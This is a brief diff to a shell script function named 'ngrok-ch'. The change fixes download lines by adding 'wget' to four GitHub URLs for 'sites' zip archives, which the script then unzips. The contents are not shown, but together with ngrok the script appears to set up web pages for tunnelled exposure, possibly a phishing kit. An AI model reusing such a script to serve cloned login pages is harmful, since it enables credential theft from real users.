@@ -28,10 +28,10 @@ ngrok-ch () {
 		echo
 		else
 		rm -f *zip > /dev/null 2>&1
-		https://github.com/rooted-cyber/good/raw/master/sites/sites1.zip 
-		https://github.com/rooted-cyber/good/raw/master/sites/sites2.zip 
-		https://github.com/rooted-cyber/good/raw/master/sites/sites3.zip 
-		https://github.com/rooted-cyber/good/raw/master/sites/sites4.zip
+		wget https://github.com/rooted-cyber/good/raw/master/sites/sites1.zip 
+		wget https://github.com/rooted-cyber/good/raw/master/sites/sites2.zip 
+		wget https://github.com/rooted-cyber/good/raw/master/sites/sites3.zip 
+		wget https://github.com/rooted-cyber/good/raw/master/sites/sites4.zip
 		unzip sites1.zip
 		unzip sites2.zip
 		unzip sites3.zip
